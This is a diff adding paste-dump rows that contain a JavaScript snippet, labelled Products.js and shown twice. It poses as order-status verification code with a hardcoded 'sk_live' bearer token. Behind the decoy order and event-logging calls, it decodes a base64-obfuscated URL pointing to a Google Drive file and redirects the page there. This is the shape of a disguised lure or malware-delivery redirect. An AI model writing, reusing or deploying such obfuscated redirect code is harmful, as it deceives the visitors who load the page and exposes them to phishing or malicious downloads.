+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+6tN3URba,Products.js,dentira,JavaScript,Sunday 6th of April 2025 06:25:59 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/60242/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
